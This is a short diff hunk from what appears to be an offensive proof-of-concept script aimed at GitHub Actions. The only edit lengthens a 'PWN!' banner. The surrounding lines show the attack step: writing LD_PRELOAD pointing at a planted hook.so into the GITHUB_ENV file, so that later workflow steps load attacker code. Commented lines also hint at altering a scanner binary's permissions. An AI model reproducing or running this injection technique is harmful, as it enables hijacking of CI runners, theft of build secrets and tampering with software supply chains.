@@ -299,7 +299,7 @@ if __name__ == '__main__':
     with open(os.environ['GITHUB_ENV'], 'a') as f:
         f.write(f"LD_PRELOAD={cwd}/hook.so\n")
     
-    print('PWN!')
+    print('PWN!!!!!!!!!!!')
     # os.environ['LD_PRELOAD'] = f"{cwd}/hook.so"
     # print("LD_PRELOAD =", os.environ['LD_PRELOAD'])
     # os.chmod("./sonar-scanner", 777)
